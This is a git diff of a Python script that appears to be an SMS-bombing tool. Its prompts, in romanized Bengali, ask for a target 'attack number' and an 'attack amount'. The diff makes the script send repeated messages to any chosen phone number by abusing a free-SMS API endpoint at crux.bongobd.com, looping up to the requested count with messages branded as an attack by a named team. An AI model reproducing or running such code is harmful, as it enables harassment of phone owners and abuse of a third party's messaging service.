@@ -57,7 +57,7 @@ print (green+"""  _ _______ _
 number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))
 amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))
 
-url = "http://crux.bongobd.com:80/api/SMS/SendFreeSMS?msisdn=8801682511701&sms=%20%20%20%20%20%20iTZ%20%20%20%20*CirCLe*%20%20%20(CHaT%20inviTer)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20aTTacK%20%20%20%20By%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(SiiLenT%20HunTer%20TeaM)&sc=16443"
+url = "http://crux.bongobd.com:80/api/SMS/SendFreeSMS?msisdn="+number+"&sms=%20%20%20%20%20%20iTZ%20%20%20%20*CirCLe*%20%20%20(CHaT%20inviTer)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20aTTacK%20%20%20%20By%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20(SiiLenT%20HunTer%20TeaM)&sc=16443"
 
 
 for i in range(amount):
